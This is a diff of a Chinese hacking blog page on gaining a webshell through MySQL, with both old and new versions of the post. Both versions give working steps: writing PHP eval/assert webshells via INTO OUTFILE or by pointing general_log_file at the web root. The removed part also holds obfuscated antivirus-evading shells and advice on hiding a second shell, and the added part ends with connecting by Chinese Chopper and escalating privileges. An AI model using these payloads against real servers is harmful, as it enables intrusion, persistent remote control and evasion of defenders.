@@ -86,22 +86,17 @@
 
 
 
-<meta name="description" content="前言: 实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你  拿shell: 利用mysql日志文">
+<meta name="description" content="前言:直接getshellselect &amp;apos;&amp;lt;?php @eval($_POST[&amp;apos;maikefee&amp;apos;]); ?&amp;gt;&amp;apos; INTO OUTFILE &amp;apos;网站目录/shell.php&amp;apos;;  mysql&amp;gt; set global general_log_file = &amp;apos;C:\ProgramData\MySQL\MySQL S">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用Mysql特性_getshell">
 <meta property="og:url" content="http://MaiKeFee.com/archives/9ddcdbfc.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="前言: 实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你  拿shell: 利用mysql日志文">
+<meta property="og:description" content="前言:直接getshellselect &amp;apos;&amp;lt;?php @eval($_POST[&amp;apos;maikefee&amp;apos;]); ?&amp;gt;&amp;apos; INTO OUTFILE &amp;apos;网站目录/shell.php&amp;apos;;  mysql&amp;gt; set global general_log_file = &amp;apos;C:\ProgramData\MySQL\MySQL S">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://maikefee.com/images/showvariablesconfig.png">
-<meta property="og:image" content="http://maikefee.com/images/showvariableswriteshell.png">
-<meta property="og:image" content="http://maikefee.com/images/showvariableslogexec.png">
-<meta property="og:image" content="http://maikefee.com/images/showvariablesres.png">
-<meta property="og:updated_time" content="2019-09-14T11:57:30.712Z">
+<meta property="og:updated_time" content="2019-09-18T17:26:41.105Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用Mysql特性_getshell">
-<meta name="twitter:description" content="前言: 实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你  拿shell: 利用mysql日志文">
-<meta name="twitter:image" content="http://maikefee.com/images/showvariablesconfig.png">
+<meta name="twitter:description" content="前言:直接getshellselect &amp;apos;&amp;lt;?php @eval($_POST[&amp;apos;maikefee&amp;apos;]); ?&amp;gt;&amp;apos; INTO OUTFILE &amp;apos;网站目录/shell.php&amp;apos;;  mysql&amp;gt; set global general_log_file = &amp;apos;C:\ProgramData\MySQL\MySQL S">
 
 
 
@@ -362,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-14T19:57:30+08:00">
-                2019-09-14
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-19T01:26:41+08:00">
+                2019-09-19
               </time>
             
           </span>
@@ -478,7 +473,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  794
+                  169
                 </span>
               
 
@@ -494,7 +489,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  1
                 </span>
               
             </div>
@@ -515,33 +510,11 @@
       
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><blockquote>
-<p>实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你</p>
-</blockquote>
-<h1 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell:"></a>拿shell:</h1><blockquote>
-<p>利用mysql日志文件来拿shell,究其原理其实也非常简单,当我们开启general_log以后,每执行一条sql都会被自动记录到这个日志文件中,我们就可以通过这种方式把我们的shell也自动写进去,运维可能平时都是拿这个查慢查询用,只会临时开启下,所以,如果想利用,就只能我们自己手动开,这就是为什么要root权限才行,因为它涉及到mysql自身参数配置,其实,这里稍微有点儿mysql常识都会懂:</p>
-</blockquote>
-<pre><code>mysql&gt; show variables like &apos;%general%&apos;;   先看下当前mysql默认的日志位置在什么地方,&apos;C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log&apos; 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来
-mysql&gt; set global general_log = on;        默认基本都是关闭的,不然这个增删改查的记录量可能会非常大</code></pre><p><img src="/images/showvariablesconfig.png" alt></p>
-<pre><code>mysql&gt; set global general_log_file = &apos;C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/abouts.php&apos;; 此时,再把原本的日志文件位置指向到目标网站的物理路径
-mysql&gt; select &apos;&lt;?php eval($_POST[request]);?&gt;&apos;;    开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell</code></pre><p><img src="/images/showvariableswriteshell.png" alt></p>
-<p><img src="/images/showvariableslogexec.png" alt></p>
-<p><img src="/images/showvariablesres.png" alt></p>
-<pre><code>mysql&gt; select &quot;&lt;?php $sl = create_function(&apos;&apos;, @$_REQUEST[&apos;klion&apos;]);$sl();?&gt;&quot;;    免杀shell,eval方式
-mysql&gt; SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;klion&apos;]));?&gt;&quot;;     别人的免杀shell,assert&amp;base64encode方式</code></pre><h1 id="处理后事"><a href="#处理后事" class="headerlink" title="处理后事"></a>处理后事</h1><blockquote>
-<p>最后,干完活儿以后务必记得把配置恢复原状[不然,目标站如果访问量比较大,日志文件可能会瞬间暴增连shell时会巨卡],拿到shell记得马上再传一个shell[放的隐蔽点,关于webshell隐藏细节,请参考博客相关文章],然后再通过新的shell把最开始这个shell删掉,谨慎一点,起码不会让你的shell掉的那么快</p>
-</blockquote>
-<pre><code>mysql&gt; set global general_log_file = &apos;C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log&apos;;
-mysql&gt; set global general_log = off;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>查看是否有写文件权限</p>
-<pre><code>show global variables like &apos;%secure%&apos;;</code></pre><p>查看日志文件存放路径及开启</p>
-<pre><code>SHOW GLOBAL VARIABLES LIKE &apos;%general_log%&apos;
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><h1 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a>直接getshell</h1><pre><code>select &apos;&lt;?php @eval($_POST[&apos;maikefee&apos;]); ?&gt;&apos; INTO OUTFILE &apos;网站目录/shell.php&apos;;
 
-set global general_log = ON;</code></pre><p>getshell 三大命令:</p>
-<pre><code>set global general_log=&apos;on&apos;;
+mysql&gt; set global general_log_file = &apos;C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log&apos;;
+mysql&gt; set global general_log = off;</code></pre><h1 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell:"></a>利用日志getshell:</h1><h2 id="查看genera文件配置情况"><a href="#查看genera文件配置情况" class="headerlink" title="查看genera文件配置情况"></a>查看genera文件配置情况</h2><pre><code>show global variables like &quot;%genera%&quot;;</code></pre><h2 id="开启日志记录"><a href="#开启日志记录" class="headerlink" title="开启日志记录"></a>开启日志记录</h2><pre><code>set global general_log=&apos;on&apos;;</code></pre><h2 id="日志文件导出指定目录"><a href="#日志文件导出指定目录" class="headerlink" title="日志文件导出指定目录"></a>日志文件导出指定目录</h2><pre><code>set global general_log_file=&apos;C:/phpstudy/WWW/shell.php&apos;;</code></pre><h2 id="记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><a href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马" class="headerlink" title="记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)"></a>记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</h2><pre><code>select &apos;&lt;?php @eval($_POST[&quot;wintrysec&quot;]); ?&gt;&apos;;</code></pre><h2 id="关闭记录"><a href="#关闭记录" class="headerlink" title="关闭记录"></a>关闭记录</h2><h2 id="set-global-general-log-off"><a href="#set-global-general-log-off" class="headerlink" title="set global general_log=off;"></a>set global general_log=off;</h2><pre><code>菜刀连接后如果是普通权限，接下来开始提权</code></pre><p>提权:<br>    <a href="https://maikefee/archives/9ccf323f.html" target="_blank" rel="noopener">https://maikefee/archives/9ccf323f.html</a></p>
 
-SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; //绝对路径
-
-SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; </code></pre>
       
     </div>
     
@@ -570,7 +543,7 @@ SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; </code></pre>
   <p><span>本文标题:</span>利用Mysql特性_getshell</p>
   <p><span>文章作者:</span>MaiKeFee</p>
   <p><span>发布时间:</span>2019年09月14日</p>
-  <p><span>最后更新:</span>2019年09月14日</p>
+  <p><span>最后更新:</span>2019年09月19日</p>
   <p><span>原始链接:</span><a href="/archives/9ddcdbfc.html" title="利用Mysql特性_getshell">http://MaiKeFee.com/archives/9ddcdbfc.html</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/9ddcdbfc.html" aria-label="复制成功！"></i></span>
   </p>
@@ -706,7 +679,7 @@ SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; </code></pre>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">75</span>
+                  <span class="site-state-item-count">76</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -717,7 +690,7 @@ SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; </code></pre>
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -784,6 +757,10 @@ SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; </code></pre>
         
         
           <li>
+            <a href="/archives/547a1354.html" title="Python黑客编程之极速入门" target="_blank">Python黑客编程之极速入门</a>
+          </li>
+        
+          <li>
             <a href="/archives/df81ef8.html" title="心得分享" target="_blank">心得分享</a>
           </li>
         
@@ -797,10 +774,6 @@ SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; </code></pre>
         
           <li>
             <a href="/archives/d4bf78e9.html" title="V2ray实现科学上网" target="_blank">V2ray实现科学上网</a>
-          </li>
-        
-          <li>
-            <a href="/archives/59bc6023.html" title="一键实现_强制通过VPN上网_VPN断线就断网" target="_blank">一键实现_强制通过VPN上网_VPN断线就断网</a>
           </li>
         
       </ul>
@@ -822,7 +795,7 @@ SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; </code></pre>
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#拿shell"><span class="nav-number">2.</span> <span class="nav-text">拿shell:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#处理后事"><span class="nav-number">3.</span> <span class="nav-text">处理后事</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结:</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#直接getshell"><span class="nav-number">2.</span> <span class="nav-text">直接getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用日志getshell"><span class="nav-number">3.</span> <span class="nav-text">利用日志getshell:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看genera文件配置情况"><span class="nav-number">3.1.</span> <span class="nav-text">查看genera文件配置情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启日志记录"><span class="nav-number">3.2.</span> <span class="nav-text">开启日志记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志文件导出指定目录"><span class="nav-number">3.3.</span> <span class="nav-text">日志文件导出指定目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><span class="nav-number">3.4.</span> <span class="nav-text">记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关闭记录"><span class="nav-number">3.5.</span> <span class="nav-text">关闭记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#set-global-general-log-off"><span class="nav-number">3.6.</span> <span class="nav-text">set global general_log=off;</span></a></li></ol></li></ol></div>
             
 
           </div>
